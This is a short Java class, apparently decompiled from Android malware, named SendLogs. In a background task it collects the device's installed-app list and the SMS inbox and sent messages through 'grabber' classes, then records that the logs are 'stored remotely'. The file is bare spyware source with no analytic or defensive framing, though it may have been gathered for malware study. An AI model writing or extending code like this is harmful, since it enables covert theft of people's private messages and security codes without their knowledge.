package sx.jolly.task;

import android.content.Context;
import android.os.AsyncTask;
import sx.jolly.grabbers.AppGrabber;
import sx.jolly.grabbers.SMSGrabber;
import sx.jolly.utils.Utils;

public class SendLogs extends AsyncTask<String, Void, Object> {
    Context context;

    public SendLogs(Context c) {
        this.context = c;
    }

    /* access modifiers changed from: protected|varargs */
    public Object doInBackground(String... params) {
        new AppGrabber(this.context).grab();
        SMSGrabber smsGrabber = new SMSGrabber(this.context);
        smsGrabber.grab("inbox");
        smsGrabber.grab("sent");
        Utils.slog(SendLogs.class, "logs stored remotely");
        return null;
    }
}
